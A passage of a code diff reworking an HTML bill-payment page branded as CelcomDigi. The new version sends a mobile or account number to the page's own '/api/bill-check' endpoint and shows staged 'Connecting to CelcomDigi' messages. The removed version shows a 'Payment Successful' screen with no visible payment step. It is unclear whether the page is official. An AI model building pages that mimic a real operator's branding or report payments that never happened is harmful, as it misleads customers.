@@ -1,475 +1,720 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>CelcomDigi | Fast and Secure Bill Payment</title>
-  <link rel="icon" type="image/x-icon" href="https://get.celcomdigi.com/global-assets/rnb/favicon/favicon.ico">
-  <link rel="apple-touch-icon" href="https://get.celcomdigi.com/global-assets/rnb/favicon/apple-touch-icon.png">
-  <meta name="theme-color" content="#001871">
-  <link rel="stylesheet" href="/get-assets/css/app.css">
-  <link rel="stylesheet" href="/get-assets/css/icons.css">
+  <link rel="icon" href="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/65486312b9b7e2d0c0e1a3c0_favicon.png" />
+  <link rel="stylesheet" href="/get-assets/css/app.css" />
   <style>
-    [x-cloak] { display: none !important; }
-    html, body { height: 100%; }
+    /* ===== RESET & BASE ===== */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif; background: #fff; color: #1a1a1a; }
 
-    /* Loading overlay */
-    #loadingBackdrop {
-      position: fixed;
-      inset: 0;
-      z-index: 50;
+    /* ===== HEADER ===== */
+    .header {
+      background: #001871;
+      padding: 14px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .header-logo img { height: 36px; }
+    .header-actions { display: flex; align-items: center; gap: 12px; }
+    .btn-shop {
+      display: flex; align-items: center; gap: 6px;
+      background: transparent; border: 2px solid #fff;
+      color: #fff; font-size: 14px; font-weight: 600;
+      padding: 8px 18px; border-radius: 50px; cursor: pointer;
+      text-decoration: none; transition: all 0.2s;
+    }
+    .btn-shop:hover { background: rgba(255,255,255,0.15); }
+    .btn-lang {
+      display: flex; align-items: center; gap: 6px;
+      background: transparent; border: 2px solid #fff;
+      color: #fff; font-size: 14px; font-weight: 600;
+      padding: 8px 16px; border-radius: 50px; cursor: pointer;
+      text-decoration: none; transition: all 0.2s;
+    }
+    .btn-lang:hover { background: rgba(255,255,255,0.15); }
+
+    /* ===== HERO BANNER ===== */
+    .hero {
+      background: linear-gradient(135deg, #001870 0%, #0064dc 60%, #0088ff 100%);
+      position: relative;
+      overflow: hidden;
+      padding: 48px 24px 56px;
+      text-align: center;
+    }
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-image: url('/get-assets/images/bg-arch-edit.webp');
+      background-size: cover;
+      background-position: center;
+      opacity: 0.6;
+    }
+    .hero h1 {
+      position: relative;
+      color: #fff;
+      font-size: clamp(24px, 5vw, 40px);
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+
+    /* ===== MAIN CARD ===== */
+    .main-card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 4px 32px rgba(0,0,0,0.12);
+      max-width: 520px;
+      margin: -24px auto 40px;
+      padding: 32px 28px;
+      position: relative;
+      z-index: 2;
+    }
+    .card-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 6px;
+    }
+    .card-subtitle {
+      font-size: 14px;
+      color: #6b7280;
+      margin-bottom: 24px;
+    }
+
+    /* ===== FORM ===== */
+    .form-group { margin-bottom: 16px; }
+    .input-wrapper {
+      position: relative;
+      border: 2px solid #d1d5db;
+      border-radius: 10px;
+      transition: border-color 0.2s;
+      background: #fff;
+    }
+    .input-wrapper:focus-within { border-color: #0064dc; }
+    .input-wrapper.error { border-color: #ef4444; }
+    .input-label {
+      position: absolute;
+      top: 10px; left: 14px;
+      font-size: 11px;
+      font-weight: 600;
+      color: #6b7280;
+      pointer-events: none;
+      transition: all 0.2s;
+    }
+    .input-wrapper.has-value .input-label,
+    .input-wrapper:focus-within .input-label { color: #0064dc; }
+    .input-wrapper.error .input-label { color: #ef4444; }
+    .form-input {
+      width: 100%;
+      border: none;
+      outline: none;
+      padding: 28px 14px 10px;
+      font-size: 16px;
+      font-weight: 500;
+      color: #1a1a1a;
+      background: transparent;
+      border-radius: 10px;
+    }
+    .error-msg {
+      color: #ef4444;
+      font-size: 13px;
+      margin-top: 6px;
+      display: none;
+    }
+    .error-msg.visible { display: block; }
+    .toggle-link {
+      display: block;
+      color: #0064dc;
+      font-size: 13px;
+      font-weight: 500;
+      margin-top: 10px;
+      cursor: pointer;
+      text-decoration: underline;
+    }
+    .toggle-link:hover { color: #0052b3; }
+
+    /* ===== SUBMIT BUTTON ===== */
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      background: #0064dc;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: all 0.2s;
       display: flex;
       align-items: center;
       justify-content: center;
-      background: rgba(255,255,255,0.5);
-      backdrop-filter: blur(4px);
+      gap: 8px;
     }
-    #loadingBackdrop.hidden { display: none; }
-    .loading-card {
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.15);
-      border: 1px solid #e5e7eb;
-      padding: 16px;
-      width: 144px;
-      height: 144px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .spinner-ring {
-      width: 60px;
-      height: 60px;
-      border: 4px solid rgb(204 224 248);
-      border-top-color: rgb(0 100 220);
+    .btn-submit:hover { background: #0052b3; }
+    .btn-submit:disabled { background: #9ca3af; cursor: not-allowed; }
+
+    /* ===== LOADING SPINNER ===== */
+    .spinner {
+      width: 20px; height: 20px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
+      display: none;
     }
+    .btn-submit.loading .spinner { display: block; }
+    .btn-submit.loading .btn-text { display: none; }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    .page { display: none; }
-    .page.active { display: flex; flex-direction: column; flex: 1; }
-
-    /* Success animation */
-    .success-check {
-      animation: checkIn 0.5s ease forwards;
+    /* ===== LOADING OVERLAY ===== */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 24, 113, 0.85);
+      z-index: 1000;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
     }
-    @keyframes checkIn {
-      from { transform: scale(0); opacity: 0; }
-      to { transform: scale(1); opacity: 1; }
+    .loading-overlay.visible { display: flex; }
+    .loading-logo { margin-bottom: 24px; }
+    .loading-logo img { height: 48px; filter: brightness(0) invert(1); }
+    .loading-spinner-big {
+      width: 56px; height: 56px;
+      border: 5px solid rgba(255,255,255,0.2);
+      border-top-color: #FFD700;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    .loading-text {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+    .loading-subtext {
+      font-size: 14px;
+      color: rgba(255,255,255,0.7);
+    }
+    .loading-steps {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      text-align: left;
+    }
+    .loading-step {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 13px;
+      color: rgba(255,255,255,0.6);
+      transition: color 0.3s;
+    }
+    .loading-step.active { color: #FFD700; }
+    .loading-step.done { color: rgba(255,255,255,0.9); }
+    .step-icon { font-size: 16px; }
+
+    /* ===== BILL RESULT CARD ===== */
+    .bill-result {
+      display: none;
+    }
+    .bill-result.visible { display: block; }
+    .bill-header {
+      background: linear-gradient(135deg, #001870, #0064dc);
+      border-radius: 12px 12px 0 0;
+      padding: 20px;
+      color: #fff;
+      margin: -32px -28px 24px;
+    }
+    .bill-header-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 12px;
+    }
+    .bill-label {
+      font-size: 12px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: rgba(255,255,255,0.7);
+    }
+    .bill-number {
+      font-size: 18px;
+      font-weight: 700;
+    }
+    .bill-amount-section {
+      text-align: center;
+      padding: 8px 0;
+    }
+    .bill-amount-label {
+      font-size: 13px;
+      color: rgba(255,255,255,0.7);
+      margin-bottom: 4px;
+    }
+    .bill-amount-value {
+      font-size: 42px;
+      font-weight: 800;
+      color: #FFD700;
+      letter-spacing: -1px;
+    }
+    .bill-due {
+      font-size: 13px;
+      color: rgba(255,255,255,0.8);
+      margin-top: 6px;
+    }
+
+    /* Screenshot display */
+    .bill-screenshot-section {
+      margin: 16px 0;
+    }
+    .bill-screenshot-label {
+      font-size: 12px;
+      font-weight: 600;
+      color: #6b7280;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 8px;
+    }
+    .bill-screenshot {
+      width: 100%;
+      border-radius: 8px;
+      border: 1px solid #e5e7eb;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    }
+
+    /* Bill details table */
+    .bill-details {
+      background: #f9fafb;
+      border-radius: 10px;
+      padding: 16px;
+      margin: 16px 0;
+    }
+    .bill-detail-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 0;
+      border-bottom: 1px solid #e5e7eb;
+      font-size: 14px;
+    }
+    .bill-detail-row:last-child { border-bottom: none; }
+    .bill-detail-label { color: #6b7280; }
+    .bill-detail-value { font-weight: 600; color: #1a1a1a; }
+    .bill-detail-value.amount { color: #0064dc; font-size: 16px; }
+
+    /* Raw data section */
+    .bill-raw-data {
+      background: #f0f4ff;
+      border: 1px solid #c7d7f8;
+      border-radius: 10px;
+      padding: 16px;
+      margin: 16px 0;
+    }
+    .bill-raw-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: #0064dc;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .bill-raw-content {
+      font-size: 13px;
+      color: #374151;
+      line-height: 1.6;
+      white-space: pre-wrap;
+      word-break: break-word;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+
+    /* Pay now button */
+    .btn-pay {
+      width: 100%;
+      padding: 14px;
+      background: #FFD700;
+      color: #001871;
+      font-size: 16px;
+      font-weight: 800;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      margin-top: 16px;
+      transition: all 0.2s;
+      text-decoration: none;
+      display: block;
+      text-align: center;
+    }
+    .btn-pay:hover { background: #FFC200; transform: translateY(-1px); }
+
+    .btn-back {
+      width: 100%;
+      padding: 12px;
+      background: transparent;
+      color: #0064dc;
+      font-size: 14px;
+      font-weight: 600;
+      border: 2px solid #0064dc;
+      border-radius: 50px;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: all 0.2s;
+    }
+    .btn-back:hover { background: #f0f4ff; }
+
+    /* ===== NOTICE ===== */
+    .notice {
+      background: #fffbeb;
+      border: 1px solid #fcd34d;
+      border-radius: 8px;
+      padding: 12px 14px;
+      font-size: 13px;
+      color: #92400e;
+      margin-top: 16px;
+      display: flex;
+      gap: 8px;
+      align-items: flex-start;
+    }
+
+    /* ===== FOOTER ===== */
+    footer {
+      background: #001871;
+      color: rgba(255,255,255,0.6);
+      text-align: center;
+      padding: 20px;
+      font-size: 12px;
+      margin-top: 40px;
+    }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 600px) {
+      .main-card { margin: -20px 16px 32px; padding: 24px 20px; }
+      .hero { padding: 36px 16px 44px; }
+      .bill-header { margin: -24px -20px 20px; }
     }
   </style>
 </head>
-<body class="flex flex-col grow min-h-screen min-w-80">
-
-  <!-- Loading Modal -->
-  <div id="loadingBackdrop" class="hidden">
-    <div class="loading-card">
-      <div class="spinner-ring"></div>
-    </div>
-  </div>
+<body>
 
   <!-- HEADER -->
-  <header class="bg-celcom-digi-blue w-full flex top-0 z-10">
-    <div class="mx-auto w-full px-4 md:container mx-auto">
-      <nav>
-        <div class="flex justify-between h-16 gap-1.5">
-          <a href="/" class="w-32 inline-block self-center">
-            <img src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/6548631227a35c7c91ebbeea_CelcomDigi_Logo_Inverted.svg" loading="lazy" alt="" class="cd-logo-img">
-          </a>
-          <div class="flex gap-1.5 my-3">
-            <a class="flex border-white items-center rounded-full border py-2.5 px-3.5 text-white gap-1.5" href="https://shop.celcomdigi.com/home" target="_blank">
-              <span class="cd-icon icon-shopping-bag-01"></span>
-              <div class="self-center text-center content-center align-middle text-xs">SHOP</div>
-            </a>
-            <div class="relative" id="lang-dropdown">
-              <a onclick="toggleLang()" class="flex items-center bg-white text-celcom-digi-blue rounded-full py-2.5 px-3.5 gap-1.5 cursor-pointer">
-                <span class="cd-icon icon-globe-02"></span>
-                <div class="self-center text-center content-center align-middle text-xs">EN</div>
-                <span class="cd-icon icon-chevron-down text-sm"></span>
-              </a>
-              <div id="lang-menu" class="hidden absolute right-0 bg-white p-2 rounded-[30px] text-center align-middle mt-0.5 border border-gray-300 shadow-md z-50">
-                <a class="text-xs text-celcom-digi-blue block px-4 py-1" href="/bill-ms">BM</a>
-              </div>
-            </div>
-          </div>
-        </div>
-      </nav>
+  <header class="header">
+    <a href="/" class="header-logo">
+      <img src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/6548631227a35c7c91ebbeea_CelcomDigi_Logo_Inverted.svg" alt="CelcomDigi" />
+    </a>
+    <div class="header-actions">
+      <a href="https://shop.celcomdigi.com/home" class="btn-shop" target="_blank">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg>
+        SHOP
+      </a>
+      <a href="#" class="btn-lang">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>
+        EN
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
+      </a>
     </div>
   </header>
 
-  <!-- MAIN CONTENT WRAPPER -->
-  <div class="grow w-full h-full font-sans flex flex-col grow">
-    <div class="flex flex-col flex-1 grow">
+  <!-- HERO -->
+  <div class="hero">
+    <h1>Fast and Secure Bill Payment</h1>
+  </div>
 
-      <!-- ===== PAGE 1: Enter Mobile/Account Number ===== -->
-      <div id="page1" class="page active">
-        <div class="cd-backdrop"></div>
-        <div class="p-10 md:container flex flex-col mx-auto w-full lg:w-10/12 xl:w-8/12 text-center text-base px-0 pb-0 grow">
-          <h2 class="text-3xl md:text-4xl text-white mb-14 text-left md:text-center px-5 font-bold">
-            Fast and Secure Bill Payment
-          </h2>
-          <div class="bg-white shadow-lg rounded-2xl p-5 md:h-min md:flex-none flex grow">
-            <form id="form-step1" class="flex flex-col flex-1 grow" onsubmit="submitStep1(event)">
-              <div class="md:my-2">
-                <h5 class="text-xl md:text-2xl text-gray-800 mb-2 font-bold text-left md:text-center">
-                  Pay Bill
-                </h5>
-                <p class="text-xs md:text-base text-left md:text-center">
-                  Pay for yourself or anyone securely.
-                </p>
-              </div>
-              <div class="w-full p-1 rounded-lg md:mb-4 flex flex-col flex-1 grow">
-                <div class="flex flex-col mt-4 text-start gap-2 md:mx-24 2xl:mx-48 mb-2">
-
-                  <!-- Mobile Number Input -->
-                  <div id="mobile-section">
-                    <div class="relative">
-                      <input id="mobile_number_input" type="tel" placeholder="Mobile number"
-                        class="peer border rounded-lg pt-6 pb-2 pl-2 w-full placeholder-transparent focus:outline-none border-gray-300"
-                        maxlength="12"
-                        oninput="handleMobileInput(this)"
-                        autocomplete="tel">
-                      <label class="absolute flex top-0 items-center pointer-events-none inset-y-0 left-2.5 w-full text-base transition-all ease-out duration-200 transform cursor-text peer-[:not(:placeholder-shown)]:-top-6 peer-[:not(:placeholder-shown)]:text-xs peer-focus:-top-6 peer-focus:text-xs text-gray-400">
-                        Mobile number
-                      </label>
-                    </div>
-                    <span id="mobile-error" style="display:none">
-                      <p class="text-xs text-error-message mt-1">Please enter a valid Celcom or Digi mobile number.</p>
-                    </span>
-                  </div>
-
-                  <!-- Account Number Input -->
-                  <div id="account-section" style="display:none">
-                    <div class="relative">
-                      <input id="account_number_input" type="text" placeholder="Account number"
-                        class="peer border rounded-lg pt-6 pb-2 pl-2 w-full placeholder-transparent focus:outline-none border-gray-300"
-                        maxlength="20"
-                        oninput="handleAccountInput(this)"
-                        autocomplete="off">
-                      <label class="absolute flex top-0 items-center pointer-events-none inset-y-0 left-2.5 w-full text-base transition-all ease-out duration-200 transform cursor-text peer-[:not(:placeholder-shown)]:-top-6 peer-[:not(:placeholder-shown)]:text-xs peer-focus:-top-6 peer-focus:text-xs text-gray-400">
-                        Account number
-                      </label>
-                    </div>
-                    <span id="account-error" style="display:none">
-                      <p class="text-xs text-error-message mt-1">Please enter a valid account number.</p>
-                    </span>
-                  </div>
-
-                  <!-- Toggle link -->
-                  <div class="mt-1">
-                    <a id="toggle-link" onclick="toggleInputMode()" class="text-xs text-celcom-digi-light-blue cursor-pointer hover:underline flex items-center gap-1">
-                      <span id="toggle-text">Use account number instead</span>
-                      <span class="cd-icon icon-chevron-right text-xs"></span>
-                    </a>
-                  </div>
-
-                </div>
-
-                <div class="flex flex-col justify-end flex-1 grow">
-                  <div class="flex w-full justify-center align-middle sticky bottom-5 md:static">
-                    <button id="submit_button" type="submit"
-                      class="flex justify-center align-middle text-white w-full md:w-min px-10 py-2 mt-4 rounded-full text-base bg-disabled-submit-button"
-                      disabled>
-                      Submit
-                    </button>
-                  </div>
-                </div>
-              </div>
-            </form>
-          </div>
-        </div>
+  <!-- LOADING OVERLAY -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-logo">
+      <img src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/6548631227a35c7c91ebbeea_CelcomDigi_Logo_Inverted.svg" alt="CelcomDigi" />
+    </div>
+    <div class="loading-spinner-big"></div>
+    <div class="loading-text">Fetching your bill...</div>
+    <div class="loading-subtext">Please wait a moment</div>
+    <div class="loading-steps">
+      <div class="loading-step active" id="step1">
+        <span class="step-icon">🔍</span>
+        <span>Connecting to CelcomDigi...</span>
       </div>
-
-      <!-- ===== PAGE 2: Confirm Payment ===== -->
-      <div id="page2" class="page">
-        <div class="cd-backdrop"></div>
-        <div class="p-10 md:container flex flex-col mx-auto w-full lg:w-10/12 xl:w-8/12 text-center text-base px-0 pb-0 grow">
-          <h2 class="text-3xl md:text-4xl text-white mb-14 text-left md:text-center px-5 font-bold">
-            Fast and Secure Bill Payment
-          </h2>
-          <div class="bg-white shadow-lg rounded-2xl p-5 md:h-min md:flex-none flex grow">
-            <div class="flex flex-col flex-1 grow">
-              <div class="md:my-2">
-                <h5 class="text-xl md:text-2xl text-gray-800 mb-2 font-bold text-left md:text-center">
-                  Pay Bill
-                </h5>
-                <p class="text-xs md:text-base text-left md:text-center">
-                  Pay for yourself or anyone securely.
-                </p>
-              </div>
-
-              <div class="w-full p-1 rounded-lg md:mb-4 flex flex-col flex-1 grow">
-                <div class="flex flex-col mt-4 text-start gap-3 md:mx-24 2xl:mx-48 mb-2">
-
-                  <!-- Account info card -->
-                  <div class="border border-gray-200 rounded-xl p-4 bg-gray-50">
-                    <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-200">
-                      <span class="text-xs text-gray-500">Account</span>
-                      <div class="flex items-center gap-2">
-                        <span class="text-sm font-semibold text-gray-800" id="info-account">-</span>
-                        <button onclick="goBack()" class="text-celcom-digi-light-blue text-xs hover:underline">Change</button>
-                      </div>
-                    </div>
-                    <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-200">
-                      <span class="text-xs text-gray-500">Name</span>
-                      <span class="text-sm font-semibold text-gray-800" id="info-name">CelcomDigi Customer</span>
-                    </div>
-                    <div class="flex justify-between items-center">
-                      <span class="text-xs text-gray-500">Outstanding Amount</span>
-                      <span class="text-lg font-bold text-celcom-digi-light-blue" id="info-amount">-</span>
-                    </div>
-                  </div>
-
-                  <!-- Payment method -->
-                  <div class="border border-gray-200 rounded-xl p-4">
-                    <p class="text-xs text-gray-500 mb-3">Payment Method</p>
-                    <div class="flex items-center gap-3">
-                      <div class="w-8 h-8 bg-gray-100 rounded-lg flex items-center justify-center">
-                        <span class="cd-icon icon-credit-card-01 text-gray-600"></span>
-                      </div>
-                      <div>
-                        <p class="text-sm font-semibold text-gray-800">Credit / Debit Card</p>
-                        <p class="text-xs text-gray-400">Visa, Mastercard, FPX</p>
-                      </div>
-                    </div>
-                  </div>
-
-                </div>
-
-                <div class="flex flex-col justify-end flex-1 grow">
-                  <div class="flex w-full justify-center align-middle sticky bottom-5 md:static">
-                    <button type="button" onclick="submitPayment()"
-                      class="flex justify-center align-middle text-white w-full md:w-min px-10 py-2 mt-4 rounded-full text-base bg-celcom-digi-light-blue">
-                      Pay Now
-                    </button>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
+      <div class="loading-step" id="step2">
+        <span class="step-icon">📱</span>
+        <span>Verifying mobile number...</span>
       </div>
-
-      <!-- ===== PAGE 3: Success ===== -->
-      <div id="page3" class="page">
-        <div class="cd-backdrop"></div>
-        <div class="p-10 md:container flex flex-col mx-auto w-full lg:w-10/12 xl:w-8/12 text-center text-base px-0 pb-0 grow">
-          <h2 class="text-3xl md:text-4xl text-white mb-14 text-left md:text-center px-5 font-bold">
-            Fast and Secure Bill Payment
-          </h2>
-          <div class="bg-white shadow-lg rounded-2xl p-5 md:h-min md:flex-none flex grow">
-            <div class="flex flex-col flex-1 grow items-center justify-center py-8">
-              <div class="success-check w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mb-6">
-                <svg class="w-10 h-10 text-green-600" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
-                  <polyline points="20 6 9 17 4 12"></polyline>
-                </svg>
-              </div>
-              <h5 class="text-xl md:text-2xl text-gray-800 mb-2 font-bold text-center">Payment Successful!</h5>
-              <p class="text-xs md:text-base text-center text-gray-500 mb-2" id="success-account"></p>
-              <p class="text-xs md:text-base text-center text-gray-500 mb-8" id="success-amount"></p>
-              <p class="text-xs text-gray-400 mb-6">A confirmation SMS will be sent to your registered number.</p>
-              <button onclick="resetForm()" class="flex justify-center align-middle text-white px-10 py-2 rounded-full text-base bg-celcom-digi-light-blue">
-                Pay Another Bill
-              </button>
-            </div>
-          </div>
-        </div>
+      <div class="loading-step" id="step3">
+        <span class="step-icon">📄</span>
+        <span>Retrieving bill details...</span>
       </div>
-
+      <div class="loading-step" id="step4">
+        <span class="step-icon">✅</span>
+        <span>Preparing your bill...</span>
+      </div>
     </div>
   </div>
 
-  <!-- FOOTER -->
-  <footer class="flex bg-celcom-digi-blue w-full text-center mt-0 py-4 px-3 sm:mt-0 justify-center">
-    <div class="container flex justify-center">
-      <p class="text-white text-xs mb-0">© Copyright 2026 CelcomDigi Berhad [Registration No. 199701009694 (425190-X)]. All Rights Reserved.</p>
+  <!-- MAIN CARD -->
+  <div class="main-card">
+
+    <!-- STEP 1: Enter Mobile Number -->
+    <div id="stepForm">
+      <div class="card-title">Pay Bill</div>
+      <div class="card-subtitle">Pay for yourself or anyone securely.</div>
+
+      <div class="form-group">
+        <div class="input-wrapper" id="inputWrapper">
+          <span class="input-label">Mobile number</span>
+          <input
+            type="tel"
+            class="form-input"
+            id="mobile_number_input"
+            placeholder=""
+            autocomplete="tel"
+            inputmode="numeric"
+          />
+        </div>
+        <div class="error-msg" id="errorMsg">
+          Please enter a valid/active Celcom or Digi mobile number.
+        </div>
+        <a class="toggle-link" id="toggleLink">Use account number instead</a>
+      </div>
+
+      <button class="btn-submit" id="submitBtn" onclick="checkBill()">
+        <span class="btn-text">Submit</span>
+        <div class="spinner"></div>
+      </button>
+
+      <div class="notice">
+        <span>ℹ️</span>
+        <span>Your bill data is fetched directly from CelcomDigi's system in real time.</span>
+      </div>
     </div>
+
+    <!-- STEP 2: Bill Result -->
+    <div id="stepResult" class="bill-result">
+      <!-- Bill header will be injected here -->
+      <div id="billContent"></div>
+
+      <button class="btn-back" onclick="goBack()">← Check Another Number</button>
+    </div>
+
+  </div>
+
+  <!-- FOOTER -->
+  <footer>
+    © Copyright 2026 CelcomDigi Berhad [Registration No. 199701009694 (425190-X)]. All Rights Reserved.
   </footer>
 
   <script>
-    let useAccountMode = false;
-    let currentNumber = '';
+    const input = document.getElementById('mobile_number_input');
+    const inputWrapper = document.getElementById('inputWrapper');
+    const errorMsg = document.getElementById('errorMsg');
+    const submitBtn = document.getElementById('submitBtn');
+    let useAccountNumber = false;
 
-    // Toggle language dropdown
-    function toggleLang() {
-      const menu = document.getElementById('lang-menu');
-      menu.classList.toggle('hidden');
-    }
-    document.addEventListener('click', function(e) {
-      const dropdown = document.getElementById('lang-dropdown');
-      if (!dropdown.contains(e.target)) {
-        document.getElementById('lang-menu').classList.add('hidden');
+    // Input formatting
+    input.addEventListener('input', function() {
+      if (this.value.length > 0) {
+        inputWrapper.classList.add('has-value');
+      } else {
+        inputWrapper.classList.remove('has-value');
       }
+      inputWrapper.classList.remove('error');
+      errorMsg.classList.remove('visible');
     });
 
-    // Toggle mobile/account mode
-    function toggleInputMode() {
-      useAccountMode = !useAccountMode;
-      const mobileSection = document.getElementById('mobile-section');
-      const accountSection = document.getElementById('account-section');
-      const toggleText = document.getElementById('toggle-text');
-      const submitBtn = document.getElementById('submit_button');
-
-      if (useAccountMode) {
-        mobileSection.style.display = 'none';
-        accountSection.style.display = 'block';
-        toggleText.textContent = 'Use mobile number instead';
-        document.getElementById('mobile_number_input').value = '';
-        document.getElementById('mobile-error').style.display = 'none';
+    // Toggle account number
+    document.getElementById('toggleLink').addEventListener('click', function() {
+      useAccountNumber = !useAccountNumber;
+      if (useAccountNumber) {
+        document.querySelector('.input-label').textContent = 'Account number';
+        input.placeholder = '';
+        this.textContent = 'Use mobile number instead';
+        document.querySelector('.card-subtitle').textContent = 'Enter your CelcomDigi account number.';
       } else {
-        mobileSection.style.display = 'block';
-        accountSection.style.display = 'none';
-        toggleText.textContent = 'Use account number instead';
-        document.getElementById('account_number_input').value = '';
-        document.getElementById('account-error').style.display = 'none';
+        document.querySelector('.input-label').textContent = 'Mobile number';
+        input.placeholder = '';
+        this.textContent = 'Use account number instead';
+        document.querySelector('.card-subtitle').textContent = 'Pay for yourself or anyone securely.';
+      }
+      input.value = '';
+      inputWrapper.classList.remove('has-value', 'error');
+      errorMsg.classList.remove('visible');
+    });
+
+    // Enter key submit
+    input.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') checkBill();
+    });
+
+    // Animate loading steps
+    function animateSteps() {
+      const steps = ['step1', 'step2', 'step3', 'step4'];
+      let current = 0;
+      const interval = setInterval(() => {
+        if (current > 0) {
+          document.getElementById(steps[current - 1]).classList.remove('active');
+          document.getElementById(steps[current - 1]).classList.add('done');
+        }
+        if (current < steps.length) {
+          document.getElementById(steps[current]).classList.add('active');
+          current++;
+        } else {
+          clearInterval(interval);
+        }
+      }, 2500);
+      return interval;
+    }
+
+    async function checkBill() {
+      const mobileNumber = input.value.trim();
+
+      if (!mobileNumber) {
+        inputWrapper.classList.add('error');
+        errorMsg.textContent = 'Please enter your mobile number.';
+        errorMsg.classList.add('visible');
+        return;
       }
 
+      // Show loading overlay
+      const overlay = document.getElementById('loadingOverlay');
+      overlay.classList.add('visible');
       submitBtn.disabled = true;
-      submitBtn.classList.remove('bg-celcom-digi-light-blue');
-      submitBtn.classList.add('bg-disabled-submit-button');
-    }
 
-    // Handle mobile input
-    function handleMobileInput(input) {
-      let val = input.value.replace(/\D/g, '');
+      // Reset steps
+      ['step1','step2','step3','step4'].forEach(s => {
+        document.getElementById(s).classList.remove('active', 'done');
+      });
+      document.getElementById('step1').classList.add('active');
+      const stepInterval = animateSteps();
 
-      if (val.length > 0 && val.startsWith('0') && !val.startsWith('60')) {
-        val = '6' + val;
-      }
-      if (val.length > 0 && !val.startsWith('6') && !val.startsWith('60')) {
-        val = '60' + val;
-      }
-      if (val.length >= 2 && !val.startsWith('60')) {
-        val = '60' + val;
-      }
+      try {
+        const response = await fetch('/api/bill-check', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ mobileNumber, useAccountNumber })
+        });
 
-      input.value = val;
-
-      const isValid = val.length >= 11 && val.length <= 12 && val.startsWith('601');
-      const submitBtn = document.getElementById('submit_button');
-      const errorEl = document.getElementById('mobile-error');
-
-      if (isValid) {
-        input.classList.remove('border-error-message', 'border-2');
-        input.classList.add('border-gray-300');
-        errorEl.style.display = 'none';
+        const data = await response.json();
+        clearInterval(stepInterval);
+        overlay.classList.remove('visible');
         submitBtn.disabled = false;
-        submitBtn.classList.remove('bg-disabled-submit-button');
-        submitBtn.classList.add('bg-celcom-digi-light-blue');
-      } else {
-        submitBtn.disabled = true;
-        submitBtn.classList.remove('bg-celcom-digi-light-blue');
-        submitBtn.classList.add('bg-disabled-submit-button');
-      }
-    }
 
-    // Handle account input
-    function handleAccountInput(input) {
-      const val = input.value.trim();
-      const submitBtn = document.getElementById('submit_button');
-
-      if (val.length >= 8) {
-        submitBtn.disabled = false;
-        submitBtn.classList.remove('bg-disabled-submit-button');
-        submitBtn.classList.add('bg-celcom-digi-light-blue');
-      } else {
-        submitBtn.disabled = true;
